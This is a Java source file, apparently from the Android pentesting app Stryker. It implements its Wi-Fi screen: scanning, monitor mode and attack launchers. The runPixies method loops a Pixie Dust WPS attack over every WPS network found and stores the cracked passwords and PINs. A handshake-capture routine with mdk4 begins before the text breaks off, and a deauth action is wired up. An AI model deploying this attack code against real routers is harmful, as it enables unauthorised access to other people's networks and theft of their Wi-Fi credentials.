package com.zalexdev.stryker.wifi;

import android.app.Activity;
import android.app.Dialog;
import android.content.Context;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.net.wifi.WifiManager;
import android.os.Bundle;
import android.text.method.ScrollingMovementMethod;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.view.Window;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;

import androidx.fragment.app.Fragment;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;
import androidx.swiperefreshlayout.widget.SwipeRefreshLayout;

import com.airbnb.lottie.LottieAnimationView;
import com.google.android.material.button.MaterialButton;
import com.google.android.material.card.MaterialCardView;
import com.google.android.material.dialog.MaterialAlertDialogBuilder;
import com.google.android.material.progressindicator.LinearProgressIndicator;
import com.google.android.material.textfield.TextInputEditText;
import com.google.android.material.textview.MaterialTextView;
import com.nambimobile.widgets.efab.ExpandableFab;
import com.nambimobile.widgets.efab.FabOption;
import com.zalexdev.stryker.MainActivity;
import com.zalexdev.stryker.R;
import com.zalexdev.stryker.custom.WiFINetwork;
import com.zalexdev.stryker.utils.AdvancedProcess;
import com.zalexdev.stryker.utils.Core;

import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.HashSet;
import java.util.List;
import java.util.Locale;
import java.util.Set;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Wifi extends Fragment {

    public ArrayList<WiFINetwork> list = new ArrayList<>();
    public SwipeRefreshLayout refresh;
    public LottieAnimationView img;
    public MaterialTextView text1;
    public MaterialTextView textSub;
    public MaterialTextView subtitle;
    public MaterialTextView ifaceValue;
    public MaterialTextView ifaceMeta;
    public MaterialTextView statusValue;
    public MaterialTextView bandValue;
    public MaterialTextView channelValue;
    public MaterialTextView countChip;
    public LinearProgressIndicator scanProgress;
    public MaterialCardView emptyCard;
    public MaterialCardView listCard;
    public Core core;
    public String wlan;
    public Activity activity;
    public Context context;
    public MaterialButton tryagain;
    public int failedscancount = 0;
    public MainActivity mainActivity;
    public ExpandableFab fab;
    public ArrayList<String> devices = new ArrayList<>();
    public ArrayList<String> wifimacs = new ArrayList<>();
    public ArrayList<String> hs = new ArrayList<>();
    public AdvancedProcess mdk4;
    public AdvancedProcess airodump;
    public ArrayList<WiFINetwork> networksHS = new ArrayList<>();
    private RecyclerView mRecyclerView;
    private WiFIAdapter mAdapter;
    private final AtomicBoolean alive = new AtomicBoolean(true);
    private Thread scanThread;
    private Thread attackThread;
    private AdvancedProcess pixieProcess;
    private ScanWifiMonitor activeMonScan;
    private MaterialButton monDurationBtn;
    private MaterialButton monBandBtn;
    private MaterialButton monStopBtn;
    private MaterialButton monToggleBtn;
    private View monOptions;

    private void safeUi(Runnable r) {
        if (activity != null && isAdded() && alive.get()) {
            activity.runOnUiThread(() -> {
                if (isAdded() && alive.get()) {
                    r.run();
                }
            });
        }
    }

    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {
        View view = inflater.inflate(R.layout.wifi_fragment, container, false);
        alive.set(true);
        activity = getActivity();
        context = getContext();
        mRecyclerView = view.findViewById(R.id.wifilist);
        refresh = view.findViewById(R.id.refresh);
        img = view.findViewById(R.id.scan_img);
        text1 = view.findViewById(R.id.scan_text);
        textSub = view.findViewById(R.id.scan_subtext);
        tryagain = view.findViewById(R.id.try_again);
        subtitle = view.findViewById(R.id.wifi_subtitle);
        ifaceValue = view.findViewById(R.id.wifi_iface_value);
        ifaceMeta = view.findViewById(R.id.wifi_iface_meta);
        statusValue = view.findViewById(R.id.wifi_status_value);
        bandValue = view.findViewById(R.id.wifi_band_value);
        channelValue = view.findViewById(R.id.wifi_channel_value);
        countChip = view.findViewById(R.id.wifi_count_chip);
        scanProgress = view.findViewById(R.id.wifi_scan_progress);
        emptyCard = view.findViewById(R.id.wifi_empty_card);
        listCard = view.findViewById(R.id.wifi_list_card);
        core = new Core(context);
        tryagain.setOnClickListener(view1 -> scan());
        fab = view.findViewById(R.id.fab);
        fab.hide();
        mainActivity = (MainActivity) activity;

        if (activity != null) {
            mRecyclerView.setLayoutManager(new LinearLayoutManager(activity));
        }

        refresh.setColorSchemeColors(
                getResources().getColor(R.color.stryker_accent),
                0xFFAB47BC);
        refresh.setOnRefreshListener(this::scan);

        View statusRow = view.findViewById(R.id.wifi_status_row);
        if (statusRow != null) {
            statusRow.setOnClickListener(v -> pickWifiInterface());
        }

        wlan = core.getString("wlan_wifi");
        ifaceValue.setText(wlan == null || wlan.isEmpty() ? "—" : wlan);
        ifaceMeta.setText(wlan == null || wlan.isEmpty() ? "—" : wlan);

        if (mainActivity != null && mainActivity.getNetworks() != null && !mainActivity.getNetworks().isEmpty()) {
            list = mainActivity.getNetworks();
            mAdapter = new WiFIAdapter(context, activity, list);
            mAdapter.setHasStableIds(true);
            mRecyclerView.setItemViewCacheSize(64);
            mRecyclerView.setAdapter(mAdapter);
            renderListState(true);
            updateAdapterMeta();
            scanProgress.setVisibility(View.GONE);
            fab.show();
            setScanIdleSubtitle();
        } else {
            scan();
        }
        FabOption fabOption = view.findViewById(R.id.fab_pixie);
        FabOption fabOption2 = view.findViewById(R.id.fab_hs);
        FabOption fabOption3 = view.findViewById(R.id.fab_deauth);
        fabOption2.setOnClickListener(view1 -> runHS());
        if (core.getBoolean("wifi")) {
            core.threadCommand("svc wifi enable");
        }
        fabOption.setOnClickListener(v -> {
            if (mAdapter != null) {
                runPixies(mAdapter.wifilist);
            }
        });
        fabOption3.setOnClickListener(v -> runDeauth());

        com.google.android.material.button.MaterialButtonToggleGroup modeGroup =
                view.findViewById(R.id.wifi_scan_mode);
        monOptions = view.findViewById(R.id.wifi_mon_options);
        monDurationBtn = view.findViewById(R.id.wifi_mon_duration_btn);
        monBandBtn = view.findViewById(R.id.wifi_mon_band_btn);
        monStopBtn = view.findViewById(R.id.wifi_mon_stop_btn);
        monToggleBtn = view.findViewById(R.id.wifi_mon_toggle_btn);
        if (monDurationBtn != null) {
            int sec = core.getInt("wifi_mon_seconds");
            if (sec == 0 && !core.getBoolean("wifi_mon_until_stop")) {
                sec = 15;
                core.putInt("wifi_mon_seconds", 15);
            }
            updateMonDurationLabel();
            monDurationBtn.setOnClickListener(v -> pickMonDuration());
        }
        if (monBandBtn != null) {
            updateMonBandLabel();
            monBandBtn.setOnClickListener(v -> pickMonBand());
        }
        if (monStopBtn != null) {
            monStopBtn.setOnClickListener(v -> {
                if (activeMonScan != null) activeMonScan.stop();
                monStopBtn.setVisibility(View.GONE);
            });
        }
        if (monToggleBtn != null) {
            monToggleBtn.setOnClickListener(v -> toggleMonitorIface());
            refreshMonitorToggleLabel();
        }
        if (modeGroup != null) {
            boolean mon = core.getBoolean("wifi_scan_monitor");
            modeGroup.check(mon ? R.id.wifi_mode_monitor : R.id.wifi_mode_station);
            if (monOptions != null) {
                monOptions.setVisibility(mon ? View.VISIBLE : View.GONE);
            }
            modeGroup.addOnButtonCheckedListener((group, checkedId, isChecked) -> {
                if (!isChecked) return;
                boolean isMon = checkedId == R.id.wifi_mode_monitor;
                core.putBoolean("wifi_scan_monitor", isMon);
                if (monOptions != null) {
                    monOptions.setVisibility(isMon ? View.VISIBLE : View.GONE);
                }
                if (!isMon) {
                    // Leaving monitor scan mode — put iface back to station
                    new Thread(this::disableMonitorForStation).start();
                }
                refreshMonitorToggleLabel();
            });
        }
        return view;
    }

    private void updateMonDurationLabel() {
        if (monDurationBtn == null) return;
        if (core.getBoolean("wifi_mon_until_stop")) {
            monDurationBtn.setText("Duration: until stop");
        } else {
            int sec = core.getInt("wifi_mon_seconds");
            if (sec <= 0) sec = 15;
            monDurationBtn.setText("Duration: " + sec + "s");
        }
    }

    private void updateMonBandLabel() {
        if (monBandBtn == null) return;
        String b = core.getString("wifi_mon_band");
        if (b == null || b.isEmpty()) b = "abg";
        if ("a".equals(b)) monBandBtn.setText("Band: 5 GHz");
        else if ("bg".equals(b)) monBandBtn.setText("Band: 2.4 GHz");
        else monBandBtn.setText("Band: 2.4+5");
    }

    private void pickMonBand() {
        CharSequence[] items = new CharSequence[]{
                "2.4 GHz only", "5 GHz only", "2.4 + 5 GHz"
        };
        new MaterialAlertDialogBuilder(context)
                .setTitle("Monitor scan band")
                .setItems(items, (d, which) -> {
                    String b = which == 0 ? "bg" : (which == 1 ? "a" : "abg");
                    core.putString("wifi_mon_band", b);
                    updateMonBandLabel();
                    if (bandValue != null) {
                        bandValue.setText(which == 0 ? "2.4" : (which == 1 ? "5" : "2.4 / 5"));
                    }
                })
                .setNegativeButton(android.R.string.cancel, null)
                .show();
    }

    private void refreshMonitorToggleLabel() {
        if (monToggleBtn == null || core == null) return;
        new Thread(() -> {
            String raw = core.getString("wlan_deauth");
            if (raw == null || raw.isEmpty()) raw = "wlan0";
            final String iface = raw;
            boolean on = false;
            try {
                on = core.monitorManager.isMonitorModeEnabled(iface)
                        || core.monitorManager.isMonitorModeEnabled(iface + "mon");
            } catch (Exception ignored) {}
            final boolean enabled = on;
            safeUi(() -> monToggleBtn.setText(enabled
                    ? ("Monitor ON · " + iface + " (tap to disable)")
                    : ("Monitor OFF · " + iface + " (tap to enable)")));
        }).start();
    }

    private void toggleMonitorIface() {
        if (core == null || context == null) return;
        monToggleBtn.setEnabled(false);
        monToggleBtn.setText("Working…");
        new Thread(() -> {
            String raw = core.getString("wlan_deauth");
            if (raw == null || raw.isEmpty()) raw = "wlan0";
            boolean on = core.monitorManager.isMonitorModeEnabled(raw)
                    || core.monitorManager.isMonitorModeEnabled(raw + "mon");
            if (on) {
                core.disableMonitorMode(raw);
                if (!raw.equals(core.getString("wlan_wifi"))) {
                    try { core.disableMonitorMode(core.getString("wlan_wifi")); } catch (Exception ignored) {}
                }
                safeUi(() -> core.toaster("Monitor disabled"));
            } else {
                boolean ok = core.enableMonitorMode(raw);
                safeUi(() -> core.toaster(ok ? "Monitor enabled" : "Failed to enable monitor"));
            }
            safeUi(() -> {
                monToggleBtn.setEnabled(true);
                refreshMonitorToggleLabel();
            });
        }).start();
    }

    private void disableMonitorForStation() {
        try {
            String deauth = core.getString("wlan_deauth");
            String wifi = core.getString("wlan_wifi");
            if (deauth != null && !deauth.isEmpty()) core.disableMonitorMode(deauth);
            if (wifi != null && !wifi.isEmpty() && !wifi.equals(deauth)) {
                core.disableMonitorMode(wifi);
            }
        } catch (Exception ignored) {
        }
        refreshMonitorToggleLabel();
    }

    private void pickMonDuration() {
        CharSequence[] items = new CharSequence[]{
                "5 seconds", "10 seconds", "15 seconds", "30 seconds", "60 seconds",
                "Until I stop", "Custom…"
        };
        new MaterialAlertDialogBuilder(context)
                .setTitle("Monitor scan duration")
                .setItems(items, (d, which) -> {
                    if (which == 5) {
                        core.putBoolean("wifi_mon_until_stop", true);
                        updateMonDurationLabel();
                        return;
                    }
                    if (which == 6) {
                        final com.google.android.material.textfield.TextInputEditText edit =
                                new com.google.android.material.textfield.TextInputEditText(context);
                        edit.setInputType(android.text.InputType.TYPE_CLASS_NUMBER);
                        edit.setHint("Seconds (5–300)");
                        edit.setText(String.valueOf(Math.max(5, core.getInt("wifi_mon_seconds"))));
                        new MaterialAlertDialogBuilder(context)
                                .setTitle("Custom duration")
                                .setView(edit)
                                .setPositiveButton(android.R.string.ok, (dd, ww) -> {
                                    try {
                                        int s = Integer.parseInt(String.valueOf(edit.getText()).trim());
                                        s = Math.max(5, Math.min(300, s));
                                        core.putBoolean("wifi_mon_until_stop", false);
                                        core.putInt("wifi_mon_seconds", s);
                                        updateMonDurationLabel();
                                    } catch (Exception ignored) {
                                        core.toaster("Invalid number");
                                    }
                                })
                                .setNegativeButton(android.R.string.cancel, null)
                                .show();
                        return;
                    }
                    int[] secs = {5, 10, 15, 30, 60};
                    core.putBoolean("wifi_mon_until_stop", false);
                    core.putInt("wifi_mon_seconds", secs[which]);
                    updateMonDurationLabel();
                })
                .setNegativeButton(android.R.string.cancel, null)
                .show();
    }

    public void scan() {
        if (context == null) return;
        fab.hide();
        failedscancount = 0;
        renderListState(false);
        if (img != null) {
            img.setAnimation(R.raw.wifi_scan);
            img.playAnimation();
        }
        text1.setText(R.string.scanning_wifi);
        textSub.setText(R.string.wifi_empty_body);
        tryagain.setVisibility(View.GONE);
        scanProgress.setVisibility(View.VISIBLE);
        scanProgress.setIndeterminate(true);
        statusValue.setText(R.string.wifi_status_scanning);
        subtitle.setText(R.string.wifi_subtitle_scanning);

        wlan = core.getString("wlan_wifi");
        ifaceValue.setText(wlan == null || wlan.isEmpty() ? "—" : wlan);
        ifaceMeta.setText(wlan == null || wlan.isEmpty() ? "—" : wlan);

        scanThread = new Thread(() -> {
            try {
                boolean monitorScan = core.getBoolean("wifi_scan_monitor");
                ArrayList<String> wlans = core.getInterfacesList();
                if (wlans.contains(wlan + "mon")) {
                    wlan = wlan + "mon";
                }

                if (monitorScan) {
                    // Monitor + clients: airodump only (skip station iw scan)
                    boolean untilStop = core.getBoolean("wifi_mon_until_stop");
                    int sec = core.getInt("wifi_mon_seconds");
                    if (sec <= 0) sec = 15;
                    if (untilStop) sec = 0;
                    final int duration = sec;
                    String band = core.getString("wifi_mon_band");
                    if (band == null || band.isEmpty()) band = "abg";
                    final String bandFinal = band;
                    safeUi(() -> {
                        text1.setText("Monitor scan…");
                        textSub.setText(untilStop
                                ? "Hopping channels — tap Stop when done"
                                : ("Hopping channels (~" + duration + "s)"));
                        statusValue.setText("Monitor");
                        if (monStopBtn != null) monStopBtn.setVisibility(View.VISIBLE);
                        updateMonBandLabel();
                    });
                    String deauthRaw = core.getString("wlan_deauth");
                    if (deauthRaw == null || deauthRaw.isEmpty()) deauthRaw = wlan.replace("mon", "");
                    activeMonScan = new ScanWifiMonitor(deauthRaw, core, duration, bandFinal)
                            .setProgressListener((snap, elapsed, hopCh) -> safeUi(() -> {
                                if (snap == null) return;
                                int withClients = 0;
                                for (WiFINetwork n : snap) {
                                    if (n.getClientCount() > 0) withClients++;
                                }
                                textSub.setText(elapsed + "s · " + snap.size() + " APs"
                                        + " · " + withClients + " w/ clients"
                                        + (hopCh > 0 ? (" · ch " + hopCh) : "")
                                        + (untilStop ? " · Stop" : ""));
                                if (channelValue != null) {
                                    channelValue.setText(hopCh > 0 ? String.valueOf(hopCh) : "hop");
                                }
                                if (bandValue != null) {
                                    if ("a".equals(bandFinal)) bandValue.setText("5");
                                    else if ("bg".equals(bandFinal)) bandValue.setText("2.4");
                                    else bandValue.setText("2.4 / 5");
                                }
                                if (!snap.isEmpty()) {
                                    list = snap;
                                    if (mainActivity != null) mainActivity.setNetworks(list);
                                    mAdapter = new WiFIAdapter(context, activity, list, true);
                                    mAdapter.setHasStableIds(true);
                                    mRecyclerView.setAdapter(mAdapter);
                                    renderListState(true);
                                    countChip.setText(String.valueOf(list.size()));
                                }
                            }));
                    ArrayList<WiFINetwork> monList = activeMonScan.run();
                    activeMonScan = null;
                    safeUi(() -> {
                        if (monStopBtn != null) monStopBtn.setVisibility(View.GONE);
                        refreshMonitorToggleLabel();
                    });
                    list = monList != null ? monList : new ArrayList<>();
                } else {
                    // Station: disable monitor first, then normal iw scan
                    disableMonitorForStation();
                    if (wlans.contains(wlan)) {
                        if (!"wlan0".equals(wlan) && wlan.contains("mon")) {
                            core.disableMonitorMode(wlan);
                            wlan = wlan.replace("mon", "");
                            core.customCommand("ip link set " + wlan + " up");
                        } else if (!"wlan0".equals(wlan)) {
                            core.customCommand("ip link set " + wlan + " up");
                        }
                    }
                    list = new ScanWifi(wlan, core).execute().get();
                    if (list == null) list = new ArrayList<>();
                    while (list.isEmpty() && failedscancount < 5) {
                        if (failedscancount == 4) break;
                        failedscancount++;
                        Thread.sleep(3000);
                        list = new ScanWifi(wlan, core).execute().get();
                        if (list == null) list = new ArrayList<>();
                    }
                }

                if (mainActivity != null) {
                    mainActivity.setNetworks(list);
                }
                if (list != null) {
                    core.saveLastWifiScan(list);
                }
                if (core.getBoolean("geomac_bg_scan") && list != null) {
                    for (WiFINetwork n : list) {
                        if (n != null && n.getMac() != null && !n.getMac().isEmpty()) {
                            com.zalexdev.stryker.geomac.GeoHooks.recordScan(
                                    context, n.getMac(), n.getSsid());
                        }
                    }
                }
                if (list == null) list = new ArrayList<>();

                for (int i = 0; i < list.size(); i++) {
                    String mac = list.get(i).getMac();
                    if (mac != null && !core.getNetwork(mac).isEmpty()) {
                        WiFINetwork w = list.get(i);
                        w.setOK(true);
                        w.setPsk(core.getListString(mac).get(0));
                        if (core.getNetwork(mac).size() > 1) {
                            w.setPin(core.getListString(mac).get(1));
                        }
                        list.set(i, w);
                    }
                }

                if (activity == null || !alive.get()) return;
                if (list.isEmpty()) {
                    safeUi(() -> {
                        if (img != null) {
                            img.setAnimation(R.raw.nothing);
                            img.playAnimation();
                        }
                        renderListState(false);
                        text1.setText(R.string.wifi_empty_title);
                        textSub.setText(R.string.cant_find_netw);
                        tryagain.setVisibility(View.VISIBLE);
                        scanProgress.setVisibility(View.GONE);
                        statusValue.setText(R.string.wifi_status_failed);
                        subtitle.setText(R.string.wifi_subtitle_none);
                        countChip.setText("0");
                        refresh.setEnabled(true);
                        refresh.setRefreshing(false);
                    });
                } else {
                    boolean sortClients = monitorScan;
                    mAdapter = new WiFIAdapter(context, activity, list, sortClients);
                    mAdapter.setHasStableIds(true);
                    safeUi(() -> {
                        mRecyclerView.setItemViewCacheSize(64);
                        mRecyclerView.setAdapter(mAdapter);
                        renderListState(true);
                        updateAdapterMeta();
                        scanProgress.setVisibility(View.GONE);
                        refresh.setRefreshing(false);
                        fab.show();
                        if (img != null) {
                            img.clearAnimation();
                        }
                        setScanIdleSubtitle();
                        refreshMonitorToggleLabel();
                    });
                }
            } catch (ExecutionException | InterruptedException e) {
                e.printStackTrace();
                safeUi(() -> {
                    scanProgress.setVisibility(View.GONE);
                    refresh.setRefreshing(false);
                    statusValue.setText(R.string.wifi_status_failed);
                });
            }
        });
        scanThread.start();
    }

    private void renderListState(boolean hasNetworks) {
        emptyCard.setVisibility(hasNetworks ? View.GONE : View.VISIBLE);
        listCard.setVisibility(hasNetworks ? View.VISIBLE : View.GONE);
    }

    private void setScanIdleSubtitle() {
        if (list == null || list.isEmpty()) {
            subtitle.setText(R.string.wifi_subtitle_none);
            statusValue.setText(R.string.wifi_status_ready);
            countChip.setText("0");
            return;
        }
        subtitle.setText(getString(R.string.wifi_subtitle_done, list.size()));
        statusValue.setText(R.string.wifi_status_ready);
        countChip.setText(String.valueOf(list.size()));
    }

    private void updateAdapterMeta() {
        ifaceMeta.setText(wlan == null || wlan.isEmpty() ? "—" : wlan);
        boolean has24 = false;
        boolean has5 = false;
        Set<Integer> channels = new HashSet<>();
        int clientAps = 0;
        if (list != null) {
            for (WiFINetwork n : list) {
                if (n.getIs5hhz()) {
                    has5 = true;
                } else {
                    has24 = true;
                }
                if (n.getChannel() > 0) channels.add(n.getChannel());
                if (n.getClientCount() > 0) clientAps++;
            }
        }
        String band = "—";
        if (core.getBoolean("wifi_scan_monitor")) {
            String b = core.getString("wifi_mon_band");
            if ("a".equals(b)) band = "5";
            else if ("bg".equals(b)) band = "2.4";
            else if (has24 && has5) band = "2.4 / 5";
            else if (has24) band = "2.4";
            else if (has5) band = "5";
            else band = "2.4 / 5";
        } else {
            if (has24 && has5) band = "2.4 / 5";
            else if (has24) band = "2.4";
            else if (has5) band = "5";
        }
        bandValue.setText(band);
        if (channels.isEmpty()) {
            channelValue.setText("—");
        } else if (core.getBoolean("wifi_scan_monitor")) {
            channelValue.setText(channels.size() + " ch");
        } else {
            channelValue.setText(String.valueOf(channels.size()));
        }
        if (core.getBoolean("wifi_scan_monitor") && subtitle != null && list != null && !list.isEmpty()) {
            subtitle.setText(list.size() + " APs · " + clientAps + " with clients (sorted)");
        }
    }

    private void pickWifiInterface() {
        if (context == null) return;
        new Thread(() -> {
            ArrayList<String> ifaces = core.getInterfacesList();
            safeUi(() -> showWifiInterfacePicker(ifaces));
        }).start();
    }

    private void showWifiInterfacePicker(ArrayList<String> interfaces) {
        if (context == null || activity == null) return;
        String[] items = new String[interfaces.size() + 1];
        for (int i = 0; i < interfaces.size(); i++) {
            items[i] = interfaces.get(i);
        }
        items[items.length - 1] = context.getString(R.string.customvalue);
        new MaterialAlertDialogBuilder(context)
                .setTitle(R.string.pick)
                .setItems(items, (di, i) -> {
                    if (i == items.length - 1) {
                        promptCustomWifiInterface();
                    } else {
                        applyWifiInterface(items[i]);
                    }
                })
                .show();
    }

    private void promptCustomWifiInterface() {
        final Dialog valueDialog = new Dialog(context);
        valueDialog.setContentView(R.layout.input_dialog);
        Window vw = valueDialog.getWindow();
        if (vw != null) {
            vw.setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
            vw.setLayout(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        }
        TextView title = valueDialog.findViewById(R.id.title);
        TextInputEditText value = valueDialog.findViewById(R.id.value);
        MaterialButton ok = valueDialog.findViewById(R.id.ok);
        MaterialButton cancel = valueDialog.findViewById(R.id.cancel);
        title.setText(R.string.customvalue);
        cancel.setOnClickListener(v -> valueDialog.dismiss());
        ok.setOnClickListener(v -> {
            String entered = value.getText() == null ? "" : value.getText().toString().trim();
            if (entered.isEmpty()) {
                value.setError(context.getString(R.string.customvalue));
                return;
            }
            valueDialog.dismiss();
            applyWifiInterface(entered);
        });
        valueDialog.show();
    }

    private void applyWifiInterface(String iface) {
        core.putString("wlan_wifi", iface);
        wlan = iface;
        ifaceValue.setText(iface);
        ifaceMeta.setText(iface);
        scan();
    }

    public boolean wifienabled() {
        if (context == null) return false;
        WifiManager wifi = (WifiManager) context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        return wifi != null && wifi.isWifiEnabled();
    }

    public boolean isPortOpen(String ip, int port) {
        Socket socket = new Socket();
        try {
            socket.connect(new InetSocketAddress(ip, port), 200);
            socket.close();
            return true;
        } catch (IOException e) {
            return false;
        }
    }

    public void runPixies(ArrayList<WiFINetwork> list) {
        if (list == null) return;
        final Dialog dialog = new Dialog(context);
        dialog.setContentView(R.layout.wifi_dialog_attack);
        Window window = dialog.getWindow();
        if (window != null) {
            window.setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
            window.setLayout(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        }
        dialog.setCancelable(false);
        TextView name = dialog.findViewById(R.id.wifi_name);
        TextView mac = dialog.findViewById(R.id.wifi_mac);
        TextView model = dialog.findViewById(R.id.wifi_model);
        TextView cancel = dialog.findViewById(R.id.wifi_cancel);
        TextView outputtext = dialog.findViewById(R.id.wifi_output);
        TextView resulttext = dialog.findViewById(R.id.wifi_result);
        TextView timertext = dialog.findViewById(R.id.timer_wifi);
        TextView successtext = dialog.findViewById(R.id.success_wifi);
        TextView progress = dialog.findViewById(R.id.progress_wifi);
        MaterialCardView info = dialog.findViewById(R.id.info_card);
        info.setVisibility(View.VISIBLE);
        AtomicBoolean cancelattack = new AtomicBoolean(false);
        TextView autoconnect = dialog.findViewById(R.id.wifi_autoconnect);
        autoconnect.setVisibility(View.VISIBLE);
        autoconnect.setText("Skip this network");

        ImageView wifiimg = dialog.findViewById(R.id.wifi_img);
        ProgressBar attack_progress = dialog.findViewById(R.id.attacking_progress);
        outputtext.setMovementMethod(new ScrollingMovementMethod());
        View outputcard = dialog.findViewById(R.id.output_card);
        final AdvancedProcess[] pixie = {null};
        final Timer[] timer = {new Timer()};

        progress.setText("Progress: 0" + "/" + list.size());
        autoconnect.setOnClickListener(v -> {
            if (pixie[0] != null) {
                pixie[0].kill();
            }
        });
        if (core.getBoolean("hide")) {
            mac.setText(Core.HIDDEN_MAC);
        }
        final int[] totalSuccess = {0};
        Thread[] pixies = new Thread[1];
        cancel.setOnClickListener(view2 -> {
            cancelattack.set(true);
            dialog.dismiss();
            if (pixie[0] != null) {
                pixie[0].kill();
            }
            try {
                timer[0].cancel();
            } catch (Exception e) {
                e.printStackTrace();
            }

            new Thread(() -> {
                restoreWpsInterface();
                if (core.isPixieIfaceDown() && core.getHSInterface().contains("wlan0")) {
                    core.customCommand("svc wifi enable");
                }
            }).start();
        });

        ArrayList<String> tried = new ArrayList<>();
        core.wpsDisableWifiIfEnabled();
        pixies[0] = new Thread(() -> {

            final int[] total = {0};

            for (WiFINetwork temp : list) {
                if (cancelattack.get()) {
                    break;
                }
                final int[] scanCount = {0};
                final int[] time = {60};
                try {
                    timer[0].cancel();
                } catch (Exception e) {
                    e.printStackTrace();
                }
                timer[0] = new Timer();
                timer[0].schedule(new TimerTask() {
                    @Override
                    public void run() {
                        time[0]--;
                        safeUi(() -> timertext.setText("Timeout: " + time[0]));
                        if (time[0] <= 0) {
                            if (pixie[0] != null) {
                                pixie[0].kill();
                            }
                            try {
                                timer[0].cancel();
                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                            safeUi(() -> outputtext.append("Timeout! Skipping...\n"));
                        }
                    }
                }, 0, 1000);
                if (temp.getWps() && !temp.isBlocked && !tried.contains(temp.getSsid())) {
                    safeUi(() -> {
                        if (core.getBoolean("hide")) {
                            name.setText(Core.HIDDEN_MAC);
                        } else {
                            mac.setText(temp.getMac());
                        }
                        name.setText(temp.getSsid());
                        if (temp.getModel() != null && temp.getModel().length() > 0) {
                            String modelka = temp.getModel();
                            model.setText(modelka);
                        } else {
                            model.setVisibility(View.GONE);
                        }
                    });


                    String cmd = " python3 -u /CORE/PixieWps/pixie.py -i " + core.getWPSInterface()
                            + " --pixie-force" + core.wpsIfaceDownFlag() + " -K -F -b " + temp.getMac();
                    pixie[0] = new AdvancedProcess(activity, context, cmd, true) {
                        @Override
                        public void onFinished(ArrayList<String> outputList) {
                            WiFINetwork result = pixieParse(outputList);
                            if (result.getOK()) {
                                totalSuccess[0]++;
                                if (core.isStoreEnabled()) {
                                    core.saveNetwork(temp.getMac(), result.getPsk(), result.getPin(), temp.ssid);
                                }
                            }
                            total[0]++;
                            tried.add(temp.getSsid());
                            if (isAdded() && alive.get()) {
                                successtext.setText("Success: " + totalSuccess[0]);
                                progress.setText("Progress: " + total[0] + "/" + list.size());
                            }
                        }

                        @Override
                        public void onNewLine(String line) {

                            if (line.contains("Associating with AP…")) {
                                scanCount[0]++;

                            }
                            if (scanCount[0] > 4) {
                                pixie[0].kill();
                                if (isAdded() && alive.get()) {
                                    outputtext.append("Router in Push Button Mode. Skipping...\n");
                                }
                            }
                            if (core.getBoolean("hide")) {
                                Matcher m = Pattern.compile("((\\w{2}:){5}\\w{2})").matcher(line);
                                if (m.find()) {
                                    line = line.replace(m.group(), Core.HIDDEN_MAC);
                                }
                            }
                            if (isAdded() && alive.get()) {
                                outputtext.append(line + "\n");
                                smoothScrool(outputtext);
                            }
                        }

                        @Override
                        public void onEvent(String line) {

                        }
                    };
                    pixieProcess = pixie[0];
                    while (pixie[0].isRunning()) {

                        try {
                            Thread.sleep(2000);
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                    }
                    restoreWpsInterface();
                    safeUi(() -> outputtext.setText("Switching to other target...\n"));
                }
            }
            restoreWpsInterface();
            try {
                timer[0].cancel();
            } catch (Exception e) {
                e.printStackTrace();
            }
            safeUi(() -> {
                core.scale(wifiimg, 1.0F);
                core.scale(attack_progress, 0.0F);
                resulttext.setVisibility(View.VISIBLE);
                outputcard.setVisibility(View.GONE);
                resulttext.setText("Successful attacks: " + totalSuccess[0] + "/" + total[0]);
                cancel.setText("Close");
                autoconnect.setVisibility(View.GONE);
                mac.setText("");
                name.setText("Attack finished");
                model.setText("");
            });
        });
        attackThread = pixies[0];
        pixies[0].start();
        dialog.show();
    }

    public void runHS() {
        final Dialog dialog = new Dialog(context);
        dialog.setContentView(R.layout.wifi_dialog_hs);
        Window window = dialog.getWindow();
        if (window != null) {
            window.setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
            window.setLayout(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        }
        dialog.setCancelable(false);

        TextView outputtext = dialog.findViewById(R.id.wifi_output);
        TextView resulttext = dialog.findViewById(R.id.wifi_result);
        MaterialButton stop = dialog.findViewById(R.id.stop);
        TextView timertext = dialog.findViewById(R.id.timer_wifi);
        TextView successtext = dialog.findViewById(R.id.success_wifi);
        TextView progress = dialog.findViewById(R.id.progress_wifi);
        MaterialCardView info = dialog.findViewById(R.id.info_card);
        info.setVisibility(View.VISIBLE);
        networksHS = new ArrayList<>();
        wifimacs = new ArrayList<>();

        AtomicBoolean cancelattack = new AtomicBoolean(false);
        View outputcard = dialog.findViewById(R.id.output_card);
        outputtext.setMovementMethod(new ScrollingMovementMethod());
        AtomicReference<Timer> csvReader = new AtomicReference<>(new Timer());

        final boolean[] device = {false};
        final int[] totalSuccess = {0};
        mdk4 = null;
        outputtext.setText("Starting monitor mode on " + core.getString("wlan_scan") + "...\n");
        new Thread(() -> {
            String scanRaw = core.getString("wlan_scan");
            if (scanRaw == null || scanRaw.isEmpty()) {
                scanRaw = core.monitorManager.getHSInterface();
            }
            final String scanIfacePref = scanRaw;
            boolean monitor = core.monitorManager.enableMonitorMode(scanIfacePref);
            String hsIface = core.getHSInterface();
            if (!monitor) {
                safeUi(() -> outputtext.setText(getString(R.string.wifi_monitor_failed, scanIfacePref)));
            } else {
